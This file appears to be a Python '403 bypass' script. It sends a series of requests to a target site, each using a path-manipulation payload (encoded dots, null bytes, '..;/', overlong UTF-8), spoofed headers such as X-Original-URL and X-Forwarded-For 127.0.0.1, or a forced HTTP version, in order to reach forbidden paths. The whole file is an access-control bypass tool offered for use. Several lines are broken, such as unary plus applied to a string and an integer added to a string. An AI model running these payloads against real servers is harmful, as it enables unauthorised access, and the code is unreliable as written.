import requests
import os
import sys
from colorama import Fore
from http.client import HTTPConnection


banner='''
         (`-')                                
         (OO )_.->                            
  .----. (_| \_)--.  .---.   .----.   .----.  
 /  ..  \\  `.'  /  / .  |  /  ..  \ \_.-,  | 
|  /  \  .\    .') / /|  | |  /  \  .  |_  <  
'  \  /  '.'    \ / '-'  ||'  \  /  '.-. \  | 
 \  `'  //  .'.  \`---|  |' \  `'  / \ `-'  / 
  `---''`--'   '--'   `--'   `---''   `---''  
           
   Author @github.com/erenlancaster'''

print(Fore.GREEN+banner)

if len(sys.argv) != 3:
    print(f"{Fore.WHITE}Usage: python3 403.py https://example.com filewithexistingfolderpaths")
    sys.exit()
if sys.argv[1].endswith("/"):
    print(f"{Fore.WHITE}[?] Please provide the URL without the last slash")
    sys.exit()

url = sys.argv[1]
path = sys.argv[2] 

r1 = requests.get(url+"/"+path)
status_code = str(r1.status_code)
length = len(r1.content)
print(Fore.WHITE+url+"/"+path + " ---> " + status_code,length)
r2 = requests.get(url+"/%2e/"+path)
status_code = str(r2.status_code)
length = len(r2.content)
print(url+"/%2e/"+path + " ---> " + status_code,length)
r3 = requests.get(url+"/"+path+"/.")
status_code = str(r3.status_code)
length = len(r3.content)
print(url+"/"+path +"/." " ---> " + status_code,length)
r33 = requests.get(url+"/"+path+"..;/")
status_code = str(r33.status_code)
length = len(r33.content)
print(url+"/"+path +"..;/" " ---> " + status_code,length)
r4 = requests.get(url+"/"+path+"//")
status_code = str(r4.status_code)
length = len(r4.content)
print(url+"/"+path +"//" " ---> " + status_code,length)
r5 = requests.get(url+"/"+path+"/./")
status_code = str(r5.status_code)
length = len(r5.content)
print(url+"/"+path +"/./" " ---> " + status_code,length)
r6 = requests.get(url+"/"+path+"%20")
status_code = str(r6.status_code)
length = len(r6.content)
print(url+"/"+path +"/%20" " ---> " + status_code,length)
r7 = requests.get(url+"/"+path+"%09")
status_code = str(r7.status_code)
length = len(r7.content)
print(url+"/"+path +"/%09" " ---> " + status_code,length)
r8 = requests.get(url+"/"+path+"..%00")
status_code = str(r8.status_code)
length = len(r8.content)
print(url+"/"+path +"/..%00" " ---> " + status_code,length)
r9 = requests.get(url+"/"+path+"..%01")
status_code = str(r9.status_code)
length = len(r9.content)
print(url+"/"+path +"/..%01" " ---> " + status_code,length)
r10 = requests.get(url+"/"+path+"..%0a")
status_code = str(r10.status_code)
length = len(r10.content)
print(url+"/"+path +"/..%0a" " ---> " + status_code,length)
r11 = requests.get(url+"/"+path+"..%0d")
status_code = str(r11.status_code)
length = len(r11.content)
print(url+"/"+path +"/..%0d" " ---> " + status_code,length)
r12 = requests.get(url+"/"+path+"~root")
status_code = str(r12.status_code)
length = len(r12.content)
print(url+"/"+path +"/~root" " ---> " + status_code,length)
r13 = requests.get(url+"/"+path+"~admin")
status_code = str(r13.status_code)
length = len(r13.content)
print(url+"/"+path +"/~admin" " ---> " + status_code,length)
r14 = requests.get(url+"/"+path+"%2e%2e/")
status_code = str(r14.status_code)
length = len(r14.content)
print(url+"/"+path +"/%2e%2e/" " ---> " + status_code,length)
r15 = requests.get(url+"/"+path+"/%252e%252e/")
status_code = str(r15.status_code)
length = len(r15.content)
print(url+"/"+path +"/%252e%252e/" " ---> " + status_code,length)
r16 = requests.get(url+"/"+path+"/%c0%af/")
status_code = str(r16.status_code)
length = len(r16.content)
print(url+"/"+path +"/%c0%af/" " ---> " + status_code,length)
HTTPConnection._http_vsn_str = 'HTTP/1.0'
r17 = requests.get(url+"/"+path)
status_code = str(r17.status_code)
length = len(r17.content)
print(url+"/"+path + " ---> " + status_code,length+ "HTTP/1.0")
HTTPConnection._http_vsn_str = 'HTTP/1.1'
r18 = requests.get(url+"/"+path)
status_code = str(r18.status_code)
length = len(r18.content)
print(url+"/"+path + " ---> " + status_code,length+ "HTTP/1.1")
HTTPConnection._http_vsn_str = 'HTTP/0.9'
r19 = requests.get(url+"/"+path)
status_code = str(r19.status_code)
length = len(r19.content)
print(url+"/"+path + " ---> " + status_code,length+ "HTTP/0.9")
HTTPConnection._http_vsn_str = 'HTTP/2'
r20 = requests.get(url+"/"+path)
status_code = str(r20.status_code)
length = len(r20.content)
print(url+"/"+path + " ---> " + status_code,length + "HTTP/2")
headers = {'X-Original-URL': + path}
r21 = requests.get(url+"/"+path,headers=headers)
status_code = str(r21.status_code)
length = len(r21.content)
print(Fore.WHITE+url+"/"+path + "-H X-Original-URL "+path+" ---> " + status_code,length)
headers = {'X-Host': '127.0.0.1'}
r32 = requests.get(url+"/"+path,headers=headers)
status_code = str(r32.status_code)
length = len(r32.content) 
print(Fore.WHITE+url+"/"+path + "-H X-Host 127.0.0.1 ---> " + status_code,length)
headers = {'X-Custom-IP-Authorization': '127.0.0.1'}
r22 = requests.get(url+"/"+path,headers=headers)
status_code = str(r22.status_code)
length = len(r22.content)
print(Fore.WHITE+url+"/"+path + "-H X-Custom-IP-Authorization 127.0.0.1 ---> " + status_code,length)
headers = {'X-Forwarded-For': 'http://127.0.0.1'}
r23 = requests.get(url+"/"+path,headers=headers)
status_code = str(r23.status_code)
length = len(r23.content)
print(Fore.WHITE+url+"/"+path + "-H X-Forwarded-For http://127.0.0.1 ---> " + status_code,length)
headers = {'X-Forwarded-For': '127.0.0.1:80'}
r24 = requests.get(url+"/"+path,headers=headers)
status_code = str(r24.status_code)
length = len(r24.content) 
print(Fore.WHITE+url+"/"+path + "-H X-Forwarded-For 127.0.0.1:80 ---> " + status_code,length)
headers = {'X-rewrite-url': + path}
r25 = requests.get(url+"/"+path,headers=headers)
status_code = str(r25.status_code)
length = len(r25.content)
print(Fore.WHITE+url+"/ -H X-rewrite-url "+path+" ---> " + status_code,length)
headers = {'Content-Length': '0'}
r27 = requests.post(url+"/"+path,headers=headers)
status_code = str(r27.status_code)
length = len(r27.content)
print(Fore.WHITE+url+"/"+path + "-H Content-Length 0 -M POST ---> " + status_code,length)
r28 = requests.get(url+"/"+path+"/*")
status_code = str(r28.status_code)
length = len(r28.content)
print(Fore.WHITE+url+"/"+path + "/* ---> " + status_code,length)
r29 = requests.get(url+"/"+path+".php")
status_code = str(r29.status_code)
length = len(r29.content)
print(Fore.WHITE+url+"/"+path + "/.php ---> " + status_code,length)
r30 = requests.get(url+"/"+path+".json")
status_code = str(r30.status_code)
length = len(r30.content)
print(Fore.WHITE+url+"/"+path + "/.json ---> " + status_code,length)
r31 = requests.get(url+"/"+path+".js")
status_code = str(r31.status_code)
length = len(r31.content)
print(Fore.WHITE+url+"/"+path + "/.js ---> " + status_code,length)

#print(a1)
